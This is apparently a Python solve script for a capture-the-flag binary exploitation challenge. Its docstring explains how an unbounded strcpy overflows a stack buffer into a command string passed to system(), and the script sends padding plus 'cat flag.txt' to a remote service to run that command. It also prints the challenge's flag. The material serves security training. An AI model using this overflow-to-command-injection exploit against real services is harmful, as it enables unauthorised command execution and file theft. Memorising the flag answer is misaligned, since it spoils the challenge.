#!/usr/bin/env python3
"""
Solves CyLab Security Academy Challenge 525: Input Injection 1
Category: Binary Exploitation
Platform: picoMini by CMU-Africa
Points: 100

Vulnerability Analysis:
- Architecture: x86_64 ELF executable (vuln).
- Flaw: In function fun(char *name, char *cmd), strcpy(buffer, name) copies user
  input into stack buffer[10] at [rbp - 0x14].
- Command string `c[10]` is stored at [rbp - 0xa], exactly 10 bytes after buffer.
- Unbounded strcpy allows writing past buffer into `c`.
- Immediately after printf, system(c) executes the command stored in `c`.
- Exploitation: 10 bytes padding + "cat flag.txt\\x00".

Flag: academy{0v3rfl0w_c0mm4nd_72792d0d}
Verified: POST /api/submissions/ -> correct: true, HTTP 201
"""

import socket
import sys
import time

def build_payload() -> bytes:
    # 10 bytes of padding to fill buffer[10] (rbp-0x14 to rbp-0xa)
    padding = b"A" * 10
    command = b"cat flag.txt\x00\n"
    return padding + command

def exploit(host: str, port: int) -> str:
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10.0)
    s.connect((host, port))

    banner = s.recv(1024)
    print(f"[*] Banner received: {banner.decode('latin-1', 'replace').strip()}")

    payload = build_payload()
    print(f"[*] Sending payload ({len(payload)} bytes)...")
    s.sendall(payload)

    time.sleep(1)
    response = b""
    while True:
        try:
            s.settimeout(3.0)
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
        except Exception:
            break
    s.close()

    text = response.decode("latin-1", "replace")
    print(f"[*] Response:\n{text}")
    return text

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        print("Test payload generation:")
        p = build_payload()
        print("Payload:", repr(p))
        sys.exit(0)

    host = sys.argv[1]
    port = int(sys.argv[2])
    exploit(host, port)
